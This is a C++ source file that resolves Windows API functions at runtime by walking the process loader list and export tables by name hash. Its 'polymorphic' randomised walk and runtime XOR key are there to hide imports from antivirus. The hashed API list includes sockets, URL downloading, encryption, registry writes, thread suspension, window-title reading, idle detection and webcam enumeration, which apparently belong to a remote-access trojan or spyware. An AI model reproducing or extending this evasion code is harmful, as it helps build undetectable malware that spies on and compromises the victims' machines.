#include "Resolver.h"
#include "Polymorph.h"
#include <stdio.h>
#include <winternl.h>
#include <intrin.h>
namespace Resolver {
    DWORD g_runtimeXorKey = 0;
    DWORD HashStringW(const wchar_t* str, size_t len) {
        DWORD hash = HASH_SEED;
        for (size_t i = 0; i < len; i++) {
            wchar_t c = str[i];
            if (c >= L'A' && c <= L'Z') c += 32;
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }
    void InitRuntimeKeys() {
        unsigned __int64 tsc1 = __rdtsc();
        volatile DWORD entropy = 0;
        for (volatile int i = 0; i < 64; i++) entropy ^= i;
        unsigned __int64 tsc2 = __rdtsc();
        DWORD key = (DWORD)(tsc1 ^ (tsc1 >> 32));
        key ^= (DWORD)(tsc2 ^ (tsc2 >> 17));
        key ^= (DWORD)((ULONG_PTR)&key);  
#ifdef _WIN64
        key ^= (DWORD)__readgsqword(0x40); 
        key ^= (DWORD)__readgsqword(0x48); 
#else
        key ^= (DWORD)__readfsdword(0x20); 
        key ^= (DWORD)__readfsdword(0x24); 
#endif
        if (key == 0) key = 0xDEADBEEF;
        g_runtimeXorKey = key;
        DWORD* hashes[] = {
            &HASH_NTDLL, &HASH_KERNEL32, &HASH_KERNELBASE, &HASH_ADVAPI32,
            &HASH_WININET, &HASH_CRYPT32, &HASH_USER32, &HASH_WS2_32,
            &HASH_IPHLPAPI, &HASH_OLE32, &HASH_OLEAUT32, &HASH_VFW32,
            &HASH_BCRYPT, &HASH_SHELL32,
            &HASH_LOADLIBRARYA, &HASH_GETPROCADDRESS, &HASH_MULTIBYTETOWIDECHAR,
            &HASH_VIRTUALALLOC, &HASH_VIRTUALPROTECT, &HASH_VIRTUALFREE,
            &HASH_GETMODULEHANDLEA, &HASH_GETSYSTEMINFO, &HASH_GETCOMPUTERNAMEA,
            &HASH_GETSYSTEMDIRECTORYA, &HASH_GETDISKFREESPACEEXA,
            &HASH_GLOBALMEMORYSTATUSEX, &HASH_GETCURRENTPROCESSID,
            &HASH_GETCURRENTTHREADID, &HASH_SETPROCESSWORKINGSETSIZE,
            &HASH_SETTHREADEXECUTIONSTATE, &HASH_GETTICKCOUNT,
            &HASH_CREATEMUTEXA, &HASH_GETLASTERROR, &HASH_GETMODULEFILENAMEA,
            &HASH_FILETIMETOSYSTEMTIME, &HASH_CREATEFILEA, &HASH_GETFILETIME,
            &HASH_CLOSEHANDLE, &HASH_CREATETOOLHELP32SNAPSHOT,
            &HASH_THREAD32FIRST, &HASH_THREAD32NEXT, &HASH_OPENTHREAD,
            &HASH_SUSPENDTHREAD, &HASH_RESUMETHREAD,
            &HASH_GETPROCESSHEAP, &HASH_HEAPALLOC, &HASH_HEAPFREE,
            &HASH_CREATEFILEMAPPINGA, &HASH_MAPVIEWOFFILE, &HASH_UNMAPVIEWOFFILE,
            &HASH_GETUSERNAMEA, &HASH_REGCREATEKEYEXA, &HASH_REGSETVALUEEXA,
            &HASH_REGOPENKEYEXA, &HASH_REGQUERYVALUEEXA, &HASH_REGCLOSEKEY,
            &HASH_OPENPROCESSTOKEN, &HASH_GETTOKENINFORMATION,
            &HASH_GETFOREGROUNDWINDOW, &HASH_GETWINDOWTEXTA,
            &HASH_GETLASTINPUTINFO, &HASH_ENUMDISPLAYDEVICESA,
            &HASH_WSASTARTUP, &HASH_WSACLEANUP, &HASH_SOCKET, &HASH_CONNECT,
            &HASH_SEND, &HASH_RECV, &HASH_CLOSESOCKET, &HASH_GETADDRINFO,
            &HASH_FREEADDRINFO, &HASH_SETSOCKOPT,
            &HASH_INTERNETOPENA, &HASH_INTERNETOPENURLA,
            &HASH_INTERNETREADFILE, &HASH_INTERNETCLOSEHANDLE,
            &HASH_CRYPTSTRINGTOBINARYA,
            &HASH_BCRYPTOPENALGORITHMPROVIDER, &HASH_BCRYPTGETPROPERTY,
            &HASH_BCRYPTCREATEHASH, &HASH_BCRYPTHASHDATA,
            &HASH_BCRYPTFINISHHASH, &HASH_BCRYPTDESTROYHASH,
            &HASH_BCRYPTCLOSEALGORITHMPROVIDER, &HASH_BCRYPTGENRANDOM,
            &HASH_BCRYPTSETPROPERTY, &HASH_BCRYPTGENERATESYMMETRICKEY,
            &HASH_BCRYPTENCRYPT, &HASH_BCRYPTDECRYPT, &HASH_BCRYPTDESTROYKEY,
            &HASH_COINITIALIZEEX, &HASH_COINITIALIZESECURITY,
            &HASH_COCREATEINSTANCE, &HASH_COUNINITIALIZE,
            &HASH_VARIANTCLEAR,
            &HASH_CAPGETDRIVERDESCRIPTIONA,
            &HASH_ISUSERANADMIN,
        };
        for (DWORD* p : hashes) *p ^= key;
    }
    LPVOID GetAPIByHash(DWORD hashDll, DWORD hashFunc) {
#ifdef _WIN64
        PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
        if (!pPeb || !pPeb->Ldr) return NULL;
        PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;

        // Level 2: Randomized walk direction (Flink or Blink)
        bool walkFwd = (Polymorph::FastRandRange(2) == 0);

        // Count modules first for random start offset
        DWORD modCount = 0;
        PLIST_ENTRY probe = head->Flink;
        while (probe && probe != head && modCount < 256) {
            modCount++;
            probe = probe->Flink;
        }

        // Random start offset (skip 0..modCount-1 entries)
        DWORD startOff = (modCount > 1) ? Polymorph::FastRandRange(modCount) : 0;

        // Position to start entry
        PLIST_ENTRY startEntry = walkFwd ? head->Flink : head->Blink;
        for (DWORD s = 0; s < startOff && startEntry != head; s++) {
            startEntry = walkFwd ? startEntry->Flink : startEntry->Blink;
        }
        if (startEntry == head) startEntry = walkFwd ? head->Flink : head->Blink;

        // Walk all modules from random start (wrap around)
        PLIST_ENTRY curr = startEntry;
        DWORD visited = 0;
        while (curr && curr != head && visited < modCount + 1) {
#ifdef _WIN64
            PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)curr - 0x10);
#else
            PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)curr - 0x08);
#endif
            curr = walkFwd ? curr->Flink : curr->Blink;
            visited++;

            // Wrap around at head
            if (curr == head) curr = walkFwd ? head->Flink : head->Blink;
            // Stop if we've visited all
            if (visited >= modCount) { /* allow last iteration to finish */ }

            if (!pEntry->FullDllName.Buffer || !pEntry->DllBase) continue;
            wchar_t* filename = pEntry->FullDllName.Buffer;
            size_t totalLen = pEntry->FullDllName.Length / sizeof(WCHAR);
            size_t filenameLen = totalLen;
            for (size_t i = 0; i < totalLen; i++) {
                if (pEntry->FullDllName.Buffer[i] == L'\\' || pEntry->FullDllName.Buffer[i] == L'/') {
                    filename = &pEntry->FullDllName.Buffer[i + 1];
                    filenameLen = totalLen - (i + 1);
                }
            }
            if ((HashStringW(filename, filenameLen) ^ g_runtimeXorKey) == hashDll) {
                if (hashFunc == 0) return pEntry->DllBase;
                PBYTE pBase = (PBYTE)pEntry->DllBase;
                PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
                PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
                DWORD expRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
                if (expRva == 0) continue;
                PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pBase + expRva);
                PDWORD pNames = (PDWORD)(pBase + pExp->AddressOfNames);
                PWORD pOrds = (PWORD)(pBase + pExp->AddressOfNameOrdinals);
                PDWORD pFuncs = (PDWORD)(pBase + pExp->AddressOfFunctions);

                // Level 2: Randomized export table scan start
                DWORD numNames = pExp->NumberOfNames;
                DWORD startIdx = (numNames > 1) ? Polymorph::FastRandRange(numNames) : 0;
                for (DWORD j = 0; j < numNames; j++) {
                    DWORD i = (startIdx + j) % numNames;
                    if ((HashString((LPCSTR)(pBase + pNames[i])) ^ g_runtimeXorKey) == hashFunc) {
                        return pBase + pFuncs[pOrds[i]];
                    }
                }
            }
        }
        return NULL;
    }
}
